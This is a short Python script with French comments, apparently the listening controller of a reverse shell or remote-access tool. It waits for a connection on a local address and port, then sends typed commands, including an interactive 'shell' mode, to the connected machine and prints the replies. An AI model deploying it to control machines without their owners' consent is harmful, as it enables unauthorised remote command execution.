import socket

# -------------- Constantes --------------
HOST_IP = "192.168.1.19"
HOST_PORT = 3500
MAX_DATA_SIZE = 4000

# --------------- Fonctions ---------------
def send(data):
    connection_socket.sendall(data.encode('ascii', errors='ignore'))
    
def listen():
    data_recues = connection_socket.recv(MAX_DATA_SIZE)
    return data_recues.decode('ascii', errors='ignore')
    
def shell_serveur():
    while True:
        
        command = input("shell: " + listen() + " > ")
        
        if command == "exit":
            return
        
        send(command)
        print(listen())


# Setup du serveur
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

# Attente de connexion
print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_adress = s.accept()
print(f"Connexion établie avec {client_adress}")

# -------------- Main --------------
while True:
	command = input("Commande: ")
	command_split = command.split(" ")

	
	if command == "":
		continue
	if command == "shell":
		send(command)
		shell_serveur()
	
	print(listen())

	

connection_socket.close()


